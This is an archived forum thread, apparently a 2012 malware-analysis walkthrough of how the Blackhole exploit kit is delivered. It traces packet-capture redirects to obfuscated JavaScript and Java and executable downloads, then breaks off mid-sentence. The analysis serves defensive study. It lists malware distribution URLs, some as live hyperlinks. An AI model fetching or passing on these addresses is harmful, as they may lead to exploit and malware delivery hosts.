@@ -1,0 +1,1378 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=2250 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:28:58 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
+<base  /><!--[if IE]></base><![endif]-->
+<meta name="generator" content="vBulletin 4.2.1" />
+<meta http-equiv="X-UA-Compatible" content="IE=9" />
+
+	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
+
+
+
+
+
+
+	<meta property="fb:app_id" content="170793809601191" />
+<meta property="og:site_name" content="Garage4hackers Forum" />
+<meta property="og:description" content="Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research." />
+<meta property="og:url" content="showthreada0d3.html?t=2250" />
+<meta property="og:type" content="article" />
+
+
+
+
+	
+		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
+	
+
+<script type="text/javascript">
+<!--
+	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
+	{
+		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
+		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
+		var yuipath = 'clientscript/yui';
+		var yuicombopath = '';
+		var remoteyui = false;
+	}
+	else	// Load Rest of YUI remotely (where possible)
+	{
+		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var remoteyui = true;
+		if (!yuicombopath)
+		{
+			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
+		}
+	}
+	var SESSIONURL = "";
+	var SECURITYTOKEN = "guest";
+	var IMGDIR_MISC = "images/misc";
+	var IMGDIR_BUTTON = "images/buttons";
+	var vb_disable_ajax = parseInt("0", 10);
+	var SIMPLEVERSION = "421";
+	var BBURL = "index.html";
+	var LOGGEDIN = 0 > 0 ? true : false;
+	var THIS_SCRIPT = "showthread";
+	var RELPATH = "showthreada0d3.html?t=2250";
+	var PATHS = {
+		forum : "",
+		cms   : "",
+		blog  : ""
+	};
+	var AJAXBASEURL = "index.html";
+// -->
+</script>
+<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>
+
+
+
+	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
+	
+		<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - Reverse Engineering and Application Cracking - RSS Feed" href="external2471.php?type=RSS2&amp;forumids=24" />
+	
+
+
+
+	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />
+
+	<!--[if lt IE 8]>
+	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
+	<![endif]-->
+
+
+	<meta name="keywords" content="exploit, deployed, http://erem.bescomputer.com/7.jpg, http://erem.bescomputer.com/9.jpg, http://erem.bescomputer.com/8.jpg, sites.http://erem.bescomputer.com/6.jpg, start, blackhole, overview" />
+	<meta name="description" content="It's been out there in the wild for quite sometime. It is a good package of multiple Exploits targeting client side vulnerabilities in Java, Adobe, Shockwave. You can find it uploaded on compromised websites or malicious domains. 
+ 
+I will discuss an interesting aspect of this exploit kit, JavaScript Obfuscation. There are some good techniques used in obfuscating the JS Code which allows it to bypass AV. Even the automated JS Unpackers and Deobfuscators are unable to handle the Obfuscated Code." />
+
+	<title> Blackhole Exploit Kit</title>
+	<link rel="canonical" href="showthreada0d3.html?t=2250" />
+	
+	<script type="text/javascript" src="clientscript/vbulletin_textedit6719.html?v=421"></script>
+	<script type="text/javascript" src="clientscript/vbulletin_post_loader6719.html?v=421"></script>
+	
+	
+	
+	
+	
+	
+		<script type="text/javascript" src="clientscript/vbulletin_lightbox6719.html?v=421"></script>
+	
+
+	
+		<link rel="stylesheet" type="text/css" href="css8d9b.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postlist.css,showthread.css,postbit.css,attachment.css,poll.css,lightbox.css" />
+	
+
+<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+
+<body>
+
+<div class="above_body"> <!-- closing tag is in template navbar -->
+<div id="header" class="floatcontainer doc_header">
+	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+	<div id="toplinks" class="toplinks">
+		
+			<ul class="nouser">
+			
+				<li><a href="register.html" rel="nofollow">Register</a></li>
+			
+				<li><a rel="help" href="faq.html">Help</a></li>
+				<li>
+			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
+			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
+				<fieldset id="logindetails" class="logindetails">
+					<div>
+						<div>
+					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
+					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
+					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
+					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
+						</div>
+					</div>
+				</fieldset>
+				<div id="remember" class="remember">
+					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
+				</div>
+
+				<input type="hidden" name="s" value="" />
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="login" />
+				<input type="hidden" name="vb_login_md5password" />
+				<input type="hidden" name="vb_login_md5password_utf" />
+			</form>
+			<script type="text/javascript">
+			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+			vB_XHTML_Ready.subscribe(function()
+			{
+			//
+				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
+				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
+				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
+				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
+			});
+			
+			function navbar_username_focus(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == 'User Name')
+				{
+				//
+					textbox.value='';
+					textbox.style.color='#000000';
+				}
+			}
+
+			function navbar_username_blur(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == '')
+				{
+				//
+					textbox.value='User Name';
+					textbox.style.color='#777777';
+				}
+			}
+			
+			function navbar_password_hint(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
+				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
+				YAHOO.util.Dom.get('navbar_password').focus();
+			}
+
+			function navbar_password(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				if (textbox.value == '')
+				{
+					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+				}
+			}
+			</script>
+				</li>
+				
+					<li id="fb_headerbox" class="hidden">
+
+	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>
+
+</li>
+
+				
+			</ul>
+		
+	</div>
+	<div class="ad_global_header">
+		 
+		 
+	</div>
+	<hr />
+</div>
+<div id="navbar" class="navbar">
+	<ul id="navtabs" class="navtabs floatcontainer">
+		
+		
+	
+		<li  id="vbtab_whatsnew">
+			<a class="navtab" href="activity.html">What's New?</a>
+		</li>
+		
+		
+
+	
+		<li  id="vbtab_cms">
+			<a class="navtab" href="content.html">Articles</a>
+		</li>
+		
+		
+
+	
+		<li class="selected" id="vbtab_forum">
+			<a class="navtab" href="forum.html">Forum</a>
+		</li>
+		
+		
+			<ul class="floatcontainer">
+				
+					
+						
+							<li id="vbflink_newposts"><a href="search8427.html?do=getnew&amp;contenttype=vBForum_Post">New Posts</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_faq"><a href="faq.html">FAQ</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_calendar"><a href="calendar.html">Calendar</a></li>
+						
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_community">
+							<a href="javascript://" class="popupctrl">Community</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbclink_members"><a href="memberlist.html">Member List</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_actions">
+							<a href="javascript://" class="popupctrl">Forum Actions</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbalink_mfr"><a href="forum.html?do=markread&amp;markreadhash=guest">Mark Forums Read</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_qlinks">
+							<a href="javascript://" class="popupctrl">Quick Links</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbqlink_posts"><a href="search2791.html?do=getdaily&amp;contenttype=vBForum_Post">Today's Posts</a></li>
+								
+									<li id="vbqlink_leaders"><a href="showgroups.html">View Site Leaders</a></li>
+								
+							</ul>
+						</li>
+					
+				
+			</ul>
+		
+
+	
+		<li  id="vbtab_blog">
+			<a class="navtab" href="blog.html">Blogs</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nja4_357">
+			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_579">
+			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_442">
+			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
+		</li>
+		
+		
+
+		<li>
+            <a class="navtab" href="pages.html">Events and Conferences</a></li>
+	</ul>
+	
+		<div id="globalsearch" class="globalsearch">
+			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
+				
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="process" />
+				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
+				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
+			</form>
+			<ul class="navbar_advanced_search">
+				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
+				
+			</ul>
+		</div>
+	
+</div>
+</div><!-- closing div for above_body -->
+
+<div class="body_wrapper">
+<div id="breadcrumb" class="breadcrumb">
+	<ul class="floatcontainer">
+		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
+		
+	<li class="navbit"><a href="forum.html">Forum</a></li>
+
+	<li class="navbit"><a href="forumdisplayffeb.html?f=20">Experts Forum</a></li>
+
+	<li class="navbit"><a href="forumdisplay345c.html?f=24">Reverse Engineering and Application Cracking</a></li>
+
+		
+	<li class="navbit lastnavbit"><span> Blackhole Exploit Kit</span></li>
+
+	</ul>
+	<hr />
+</div>
+
+
+<div style="width:728px; margin:0 auto; padding-bottom:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 728;
+google_ad_height = 15;
+google_ad_format = "728x15_0ads_al_s";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- garage1 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-6847984837250662"
+     data-ad-slot="4036513682"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+
+	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
+		<input type="hidden" name="do" value="dismissnotice" />
+		<input type="hidden" name="s" value="" />
+		<input type="hidden" name="securitytoken" value="guest" />
+		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
+		<input type="hidden" name="url" value="" />
+		<ol>
+			<li class="restore" id="navbar_notice_2">
+	
+	<html>
+<h2>
+The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 
+
+
+</h2>
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=2250 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:28:58 GMT -->
+</html>
+</li>
+		</ol>
+	</form>
+
+
+
+
+
+	<div id="above_postlist" class="above_postlist">
+		
+
+		<div id="pagination_top" class="pagination_top">
+		
+			<div id="postpagestats_above" class="postpagestats">
+				Results 1 to 9 of 9
+			</div>
+		</div>
+	</div>
+<div id="pagetitle" class="pagetitle">
+	<h1>
+		Thread: <span class="threadtitle"><a href="showthreada0d3.html?t=2250" title="Reload this Page">Blackhole Exploit Kit</a></span>
+
+<a class="a2a_dd" href="../external.html?link=http://www.addtoany.com/share_save"><img src="../static.addtoany.com/buttons/share_save_171_16.png" width="171" height="16" border="0" alt="Share/Save - My123World.Com!"/></a><script type="text/javascript">a2a_show_title=1;a2a_num_services=14;</script><script type="text/javascript" src="../static.addtoany.com/menu/page.js"></script>
+
+		
+			
+<fb:like href="showthreada0d3.html?t=2250" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like>
+		
+	</h1>
+</div>
+	<div id="thread_controls" class="thread_controls">
+		<div>
+		<ul id="postlist_popups" class="postlist_popups popupgroup">
+			
+			<li class="popupmenu" id="threadtools">
+				<h6><a class="popupctrl" href="javascript://">Thread Tools</a></h6>
+				<ul class="popupbody popuphover">
+					<li><a href="printthreadb615.html?t=2250&amp;pp=10&amp;page=1" accesskey="3" 
+						rel="nofollow">Show Printable Version</a></li>
+					<li><a href="sendmessagef7b5.html?do=sendtofriend&amp;t=2250"
+						rel="nofollow">Email this Page&hellip;</a></li>
+					<li>
+						
+							<a href="subscription9594.html?do=addsubscription&amp;t=2250" 
+								rel="nofollow">Subscribe to this Thread&hellip;</a>
+											
+					</li>
+					
+				</ul>
+			</li>
+
+			
+
+			
+				<li class="popupmenu searchthread" id="searchthread">
+					<h6><a class="popupctrl" href="javascript://">Search Thread</a></h6>
+					<form action="../external.html?link=http://garage4hackers.com/search.php" method="post">
+						<ul class="popupbody popuphover">
+							<li>
+								<input type="text" name="query" class="searchbox" value="Search..." tabindex="13" />
+								<input type="submit" class="button" value="Search" tabindex="14" />
+							</li>
+							<li class="formsubmit">
+								<div><a class="advancedsearchlink" href="search8d4a.html?search_type=1&amp;searchthreadid=2250&amp;contenttype=vBForum_Post">Advanced Search</a></div>
+							</li>
+						</ul>
+						<input type="hidden" name="s" value="" />
+						<input type="hidden" name="securitytoken" value="guest" />
+						<input type="hidden" name="do" value="process" />
+						<input type="hidden" name="searchthreadid" value="2250" />
+						<input type="hidden" name="search_type" value="1" />
+						<input type="hidden" name="contenttype" value="vBForum_Post" />
+
+					</form>
+				</li>
+			
+
+			
+
+			
+				<li class="popupmenu" id="displaymodes">
+					<h6><a class="popupctrl" href="javascript://">Display</a></h6>
+					<ul class="popupbody popuphover">
+						<li><a href="showthread06f8.html?t=2250&amp;p=7663&amp;mode=linear#post7663"> Switch to Linear Mode</a></li>
+						<li><a href="showthread2c47-2.html?t=2250&amp;mode=hybrid"> Switch to Hybrid Mode</a></li>
+						<li><label>Threaded Mode</label></li>
+					</ul>
+				</li>
+			
+
+			
+		</ul>
+		</div>
+	</div>
+
+<div id="postlist" class="postlist restrain">
+	
+		<script type="text/javascript">
+<!--
+var imgdir_statusicon = "images/statusicon";
+var imgdir_misc = "images/misc";
+var cleargifurl = "clear.gif";
+var guestphrase = "Guest";
+var morephrase = "More replies below current depth...";
+var highlightwords = "";
+//-->
+</script>
+
+<script type="text/javascript" src="clientscript/vbulletin_thrdpostlist6719.html?v=421"></script>
+
+<script type="text/javascript">
+<!--
+// initialize some variables
+var curpostid = 7663;
+var quickreply = false;
+
+// cached posts (no page reload required to view)
+pd[7663] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_7663">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">04-30-2012,&nbsp;<span class="time">11:03 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post7663" href="showthread.php?t=2250&amp;p=7663&amp;viewfull=1#post7663" class="postcounter">#1</a><a id="postcount7663" name="1"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_7663_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n				<h2 class="title icon">\r\n					Blackhole Exploit Kit\r\n				</h2>\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_7663">\r\n						<blockquote class="postcontent restore ">\r\n							It\'s been out there in the wild for quite sometime. It is a good package of multiple Exploits targeting client side vulnerabilities in Java, Adobe, Shockwave. You can find it uploaded on compromised websites or malicious domains.<br />\r\n<br />\r\nI will discuss an interesting aspect of this exploit kit, JavaScript Obfuscation. There are some good techniques used in obfuscating the JS Code which allows it to bypass AV. Even the automated JS Unpackers and Deobfuscators are unable to handle the Obfuscated Code.<br />\r\n<br />\r\nIt gives us an opportunity to manually deobfuscate the code. If you are into Reversing Custom Packed Malwares, then I hope you understand the excitement in manually analyzing the code <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /><br />\r\n<br />\r\nLet\'s start with a brief overview of how this exploit kit is being deployed on various sites. I\'ll try to put as many screenshots as possible just in case you prefer a visual writeup better:<br />\r\n<br />\r\nYou visit a web page with a URL looking like:<br />\r\n<br />\r\nhxxp://www.checkthisout.com/&lt;random 8 alphanumeric chars&gt;/index.html<br />\r\n<br />\r\nFor instance, I found this one in the wild: hxxp://polumin.hu/yoKUoxiG/index.html<br />\r\n<br />\r\nThe PCAP Screenshots follow:<br />\r\n<br />\r\n<img src="http://garage4hackers.com/attachment.php?attachmentid=344&amp;d=1335762785" border="0" alt="Name:  uLKWt.jpg\r\nViews: 1243\r\nSize:  21.7 KB"  style="float: CONFIG" /><br />\r\n<br />\r\nHTTP Response tells us that it is gzip encoded. (&quot;Content-Encoding: gzip&quot;)<br />\r\n<br />\r\nLet\'s decode it and we get:<br />\r\n<br />\r\n<img src="http://garage4hackers.com/attachment.php?attachmentid=345&amp;d=1335762866" border="0" alt="Name:  JOpJB.png\r\nViews: 1251\r\nSize:  2.8 KB"  style="float: CONFIG" /><br />\r\n<br />\r\nSo, it is redirecting us to: <a href="http://terramaresturismo.com.br/MeyBxZaD/js.js" target="_blank">http://terramaresturismo.com.br/MeyBxZaD/js.js</a><br />\r\n<br />\r\nInteresting. Let\'s keep following it to get to the good stuff <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /><br />\r\n<br />\r\nNext PCAP:<br />\r\n<br />\r\n<img src="http://garage4hackers.com/attachment.php?attachmentid=346&amp;d=1335762907" border="0" alt="Name:  AiyOh.jpg\r\nViews: 1236\r\nSize:  21.5 KB"  style="float: CONFIG" /><br />\r\n<br />\r\nSo, the previously discovered JS is again redirecting us to:<br />\r\n<br />\r\n<a href="http://69.194.192.229/showthread.php?t=d7ad916d1c0396ff" target="_blank">http://69.194.192.229/showthread.php?t=d7ad916d1c0396ff</a><br />\r\n<br />\r\nHop onto it:<br />\r\n<br />\r\nPCAP:<br />\r\n<br />\r\n<a href="http://i.imgur.com/aqGdX.png" target="_blank">http://i.imgur.com/aqGdX.png</a><br />\r\n<br />\r\nAren\'t you delighted to see the HTTP Response?<br />\r\n<br />\r\nWe have a huge obfuscated JS code in response.<br />\r\n<br />\r\nBut analyzing further, we notice that it sends another chunk of obfuscated JS in response:<br />\r\n<br />\r\nPCAP:<br />\r\n<br />\r\n<a href="http://i.imgur.com/teTk3.png" target="_blank">http://i.imgur.com/teTk3.png</a><br />\r\n<br />\r\nOverwhelming! Now, we have 2 obfuscated JS to analyze.<br />\r\n<br />\r\nLet us save and keep them safe. We have to analyze them further.<br />\r\n<br />\r\nIf we look at the PCAP, this is followed by an HTTP Request for Klot.jar and a random name executable.<br />\r\n<br />\r\nI\'ll just put the display filter, http.request.method == &quot;GET&quot; and let you take a look for yourself:<br />\r\n<br />\r\n<img src="http://garage4hackers.com/attachment.php?attachmentid=347&amp;d=1335763856" border="0" alt="Name:  DpIWS.jpg\r\nViews: 1211\r\nSize:  21.1 KB"  style="float: CONFIG" />\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_7663" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_7663" class="newreply" href="newreply.php?do=newreply&amp;p=7663" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7663" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[7664] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_7664">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">04-30-2012,&nbsp;<span class="time">11:11 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post7664" href="showthread.php?t=2250&amp;p=7664&amp;viewfull=1#post7664" class="postcounter">#2</a><a id="postcount7664" name="2"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_7664_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_7664">\r\n						<blockquote class="postcontent restore ">\r\n							We will start with the JS Deobfuscation.<br />\r\n<br />\r\nI will at first pick the second malicious JS sent to us in the response. However, I will not mention the details and instead put the link to my paper on exploit-db which discusses about this JS.<br />\r\n<br />\r\nOpen the PDF from here: <a href="http://www.exploit-db.com/wp-content/themes/exploit/docs/18746.pdf" target="_blank">http://www.exploit-db.com/wp-content...docs/18746.pdf</a><br />\r\n<br />\r\nGo to Page 12 and start following from there.<br />\r\n<br />\r\nI have discussed the various tricks and techniques used by the obfuscator. It also presents a manual approach to deobfuscate the code efficiently.<br />\r\n<br />\r\nTo summarize it, you need to extract the decoding logic from the obfuscated JS and create a new HTML page. Put the obfuscated chunk of JS in it followed by the decoding logic and let it tell you the result.<br />\r\n<br />\r\nThere were 2 layers of obfuscation and the resulting HTML page was exploiting the 